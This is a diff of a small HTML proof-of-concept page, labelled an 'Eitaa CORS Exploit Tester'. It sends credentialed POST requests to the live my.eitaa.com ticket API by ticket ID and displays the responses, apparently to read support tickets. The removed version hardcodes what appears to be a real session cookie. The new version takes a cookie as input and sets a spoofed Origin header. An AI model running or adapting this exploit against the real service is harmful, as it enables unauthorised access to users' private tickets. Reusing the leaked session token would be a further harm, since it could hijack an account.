@@ -1,61 +1,68 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Eitaa CORS PoC</title>
-<style>
-body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
-input, button { padding:10px; margin:5px; }
-pre { background:#000; padding:10px; border:1px solid #0f0; }
-</style>
+    <title>Eitaa CORS Tester</title>
+    <style>
+        body { font-family: monospace; padding: 20px; }
+        input, textarea { width: 100%; margin-bottom: 10px; }
+        button { padding: 10px; cursor: pointer; }
+        pre { background: #111; color: #0f0; padding: 10px; overflow:auto; }
+    </style>
 </head>
 <body>
 
-<h2>Eitaa CORS Exploit Tester</h2>
+<h2>Raw CORS Request Tester (Eitaa)</h2>
 
-<input id="tid" placeholder="Ticket ID (e.g. 490188)" />
-<button onclick="run()">Send Request</button>
+<label>Ticket ID:</label>
+<input id="ticket" value="490188">
 
-<pre id="out">Waiting...</pre>
+<label>Session Cookie:</label>
+<textarea id="cookie">myeitaa_session=PUT_YOUR_COOKIE_HERE</textarea>
+
+<button onclick="sendReq()">Send Request</button>
+
+<pre id="out"></pre>
 
 <script>
+async function sendReq() {
 
-const COOKIE = "myeitaa_session=eyJpdiI6ImNXT25FRmc1U1RidkE1UkV4cllUaEE9PSIsInZhbHVlIjoiSGlQbmNMQllqejRHZ3AvRllvY0tVSXpMMnJJOW9Od2J5REgxWXRHdW16YXFRSHVlc0xiOVE4YnpnRmtyUy83ZTJnTlZqUS8zeUZ3ZXlacWFXeWh5bzFtdDlNcEdmWWFQNEh3RUdOclFia1p1Z2Y0UHQvaUhQeDExWHpKMTJ6czgiLCJtYWMiOiI0YmRkNzc3Nzg2N2NmNmI2MTU2ZjA0ZWZmODlmYWU3N2U3YjUyMDExZGI2ZWM4YTU3YzQ2YThkYzM1MzA1Y2NjIiwidGFnIjoiIn0%3D";
+    const ticketId = document.getElementById("ticket").value.trim();
+    const cookie = document.getElementById("cookie").value.trim();
 
-async function run(){
+    const url = `https://my.eitaa.com/api/v1/ticket/show/${ticketId}`;
 
-    const id = document.getElementById("tid").value;
-
-    if(!id){
-        document.getElementById("out").innerText = "Enter Ticket ID";
-        return;
-    }
-
-    try{
-
-        const url = `https://my.eitaa.com/api/v1/ticket/show/${id}`;
+    try {
 
         const res = await fetch(url, {
             method: "POST",
-            credentials: "include",
             headers: {
                 "Accept": "application/json, text/plain, */*",
-                "Cookie": COOKIE,
-                "Content-Type": "application/json"
+                "Content-Type": "application/json",
+                "Origin": "https://my.eitaa.com",
+                "Cookie": cookie
             },
-            body: ""
+            credentials: "include"
         });
 
         const text = await res.text();
 
-        document.getElementById("out").innerText =
-            "STATUS: " + res.status + "\n\n" + text;
+        let output =
+            "STATUS: " + res.status + "\n\n" +
+            "RESPONSE HEADERS:\n";
 
-    } catch(e){
-        document.getElementById("out").innerText = "ERROR:\n" + e;
+        res.headers.forEach((v, k) => {
+            output += k + ": " + v + "\n";
+        });
+
+        output += "\nRESPONSE BODY:\n" + text;
+
+        document.getElementById("out").innerText = output;
+
+    } catch (e) {
+        document.getElementById("out").innerText =
+            "ERROR:\n" + e;
     }
 }
-
 </script>
 
 </body>
